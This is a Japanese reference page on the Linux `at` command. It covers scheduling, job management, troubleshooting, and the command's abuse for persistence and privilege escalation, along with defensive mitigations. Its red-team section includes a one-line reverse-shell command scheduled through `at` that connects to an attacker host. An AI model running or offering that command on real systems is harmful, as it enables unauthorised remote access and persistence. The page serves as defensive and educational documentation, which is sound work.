# Command  - Linux - at - 指定した時刻に一度だけコマンドを実行する

## 概要

`at` コマンドは、将来の特定の時刻にコマンドやスクリプトを**一度だけ**実行するように予約（スケジュール）するためのユーティリティです。予約されたジョブは、バックグラウンドで動作する `atd` デーモンによって管理され、指定時刻になると実行されます。システムの再起動やサービスの一時的な停止など、定期実行には向かない単発のタスクを、サービス影響の少ない深夜などに実行させたい場合に非常に便利です。

(出自: `at` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| **`cron`** | `cron` は**定期的・周期的**なタスクを実行します。`at` は**一回限り**のタスクを実行します。 | - |
| **`systemd-run`** | コマンドを一時的なsystemdユニットとして実行します。よりモダンで、`journalctl` との連携など、`systemd` のエコシステムと統合されています。 | `systemd-run` |
| **`sleep`** | `sleep <sec>; command` は指定時間待機しますが、ターミナルセッションを維持する必要があります。`at` はログアウト後も実行されます。 | - |

## よく連携されるコマンド

`at` は標準入力から実行するコマンドを読み込むため、`echo` やヒアドキュメント (`<<`) といったシェル機能と連携するのが基本です。

### シナリオ例: スクリプトファイルを指定して実行予約する (インフラ構築・運用視点)

* **目的**: 複雑な処理を記述したシェルスクリプトを、来週月曜の深夜1時に実行予約する。
* **連携コマンド**: `at` (`-f` オプション)
* **解説**: 実行したいコマンドが複雑な場合は、スクリプトファイルとして保存し、`-f` オプションでそのファイルを指定するのが確実で管理しやすくなります。
* **コマンド例**:

```bash
# /opt/scripts/backup.sh というバックアップスクリプトを予約

at -f /opt/scripts/backup.sh 1am next monday

```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **ジョブのスケジュール** | |
| ⭐ `<time>` | 実行時刻を指定します。（例: `now + 5 minutes`, `16:00`, `2am tomorrow`） |
| `-f <file>` | 標準入力の代わりに、指定したファイルから実行するコマンドを読み込みます。 |
| `-q <queue>` | ジョブのキュー（優先度）を指定します。 |
| **ジョブの管理** | |
| ⭐ `-l` | `atq` コマンドのエイリアス。予約されているジョブの一覧を表示します。 |
| ⭐ `-d <job_id>` | `atrm` コマンドのエイリアス。指定したジョブIDの予約を削除します。 |
| `-c <job_id>` | 指定したジョブIDのジョブの内容（実行されるコマンドや環境変数）を表示します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: サービス影響の少ない深夜帯に、一度だけシステムの再起動を予約する。
* **組み合わせ**: `echo "command" | at <time>`
* **解説**: `echo` とパイプを使い、単一のコマンドを指定した時刻に実行予約する、最も手軽で基本的な使い方です。
* **例**:

```bash
# 今晩23:30にシステムをシャットダウン

echo "sudo shutdown -h now" | at 23:30

```

### 2. ブルーチーム視点

* **タスク**: システムに不審な予約ジョブがないかを確認し、その内容を調査する。
* **組み合わせ**: `atq`, `at -c <job_id>`
* **解説**: 攻撃者が永続化のために `at` ジョブを仕掛けていないか調査します。`atq` で不審なユーザーによるジョブを見つけ、`at -c` でその具体的なコマンドを確認します。
* **例**:

```bash
# 全ユーザーのatジョブをリストアップ

atq

# 不審なジョブID 15 の内容を確認

at -c 15

```

### 3. レッドチーム視点

* **タスク**: 指定した時刻にリバースシェルを起動させ、永続化を図る。
* **組み合わせ**: `echo "bash -c '...'" | at <time>`
* **解説**: `cron` ほど頻繁に監視されていない可能性がある `at` を利用して、検知を逃れつつ、ブルーチームの活動時間外（深夜など）に再度侵入するための足がかりを仕掛けます。
* **例**:

```bash
# 翌日の午前2時に自分のサーバ(10.0.0.5:4444)へリバースシェルを接続させる

echo "bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" | at 2am tomorrow

```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `Garbled time` / `Invalid time specification`
		* **考えられる原因**: 時刻の指定形式が `at` コマンドに解釈できない形式です。
		* **解決策**: `HH:MM`, `now + 5 minutes`, `noon`, `2am tomorrow`, `16:00 2025-09-22` のような正しい時刻形式を使用します。`man 5 at` で詳細な書式を確認できます。

2. **エラーメッセージ例 2**: `You do not have permission to use at.`
		* **考えられる原因**: `/etc/at.allow` または `/etc/at.deny` ファイルによって `at` コマンドの使用が制限されています。
		* **解決策**: システム管理者に連絡して、`/etc/at.allow` に自身のユーザー名を追加してもらうか、`/etc/at.deny` から削除してもらう必要があります。

3. **エラーメッセージ例 3**: `Job is not queued, because the atd daemon is not running.`
		* **考えられる原因**: `at` ジョブを管理する `atd` デーモンが起動していません。
		* **解決策**: `sudo systemctl start atd` でデーモンを起動し、`sudo systemctl enable atd` で永続化します。

## 環境変数と設定ファイル

* 一般的な環境変数・設定ファイルは [Linux共通の環境変数・設定ファイル](./environment_and_config.md) を参照。

### 関連する設定ファイル

* **`/etc/at.allow`**, **`/etc/at.deny`**: `at` コマンドの使用をユーザー単位で制御します。
* **`/var/spool/cron/atjobs/`**: 予約されたジョブの実行内容が保存されるディレクトリ。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `at` 自体の脆弱性は稀ですが、システムのアクセス制御の設定不備がセキュリティリスクに直結します。
* **悪用シナリオ**: 攻撃者が低権限ユーザーを奪取した後、そのユーザーに `at` の実行権限が与えられていた場合、`at` を使ってリバースシェルの起動を予約するなど、「**永続化 (Persistence)**」の手法として悪用します。

### GTFOBins / LOLBAS における利用例

* **機能**: **Privilege Escalation** (権限昇格), **Persistence** (永続化)
* **解説**: `sudo` 権限で `at` を実行できる場合、予約したジョブは `root` 権限で実行されるため、実質的に任意のコマンドをrootとして実行できます。
* **参照**: `https://gtfobins.github.io/gtfobins/at/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: `/etc/at.allow` と `/etc/at.deny` を適切に設定し、不要なユーザーに `at` の実行権限を与えない。`sudoers` の設定を厳格にし、`at` のようなコマンドに安易に `sudo` 権限を付与しない。
* **Detection (検知)**: `/var/spool/cron/atjobs/` ディレクトリをファイル整合性監視(FIM)ツールの監視対象に加え、不審なジョブの作成を検知する。`atq` コマンドの出力を定期的に監視する。

## 注意点・補足

* **`atd` デーモンの確認**: `at` を利用するには、`atd` デーモンが稼働している必要があります。`systemctl status atd` で確認してください。
